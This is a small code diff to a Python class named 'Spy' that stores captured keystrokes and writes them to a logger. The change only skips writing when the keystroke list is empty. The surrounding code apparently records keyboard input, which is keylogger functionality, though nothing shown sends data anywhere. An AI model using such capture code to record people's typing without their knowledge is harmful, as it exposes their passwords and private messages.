@@ -59,8 +59,9 @@ class Spy:
         """
         Clears and prints the currently stored keystrokes to logger.
         """
-        logger.write(" ".join(str(x) for x in Spy.keycode_list))
-        Spy.keycode_list = []
+        if Spy.keycode_list:
+            logger.write(" ".join(str(x) for x in Spy.keycode_list))
+            Spy.keycode_list = []
 
 
 def _callback_func(proxy, type_, event, logger):
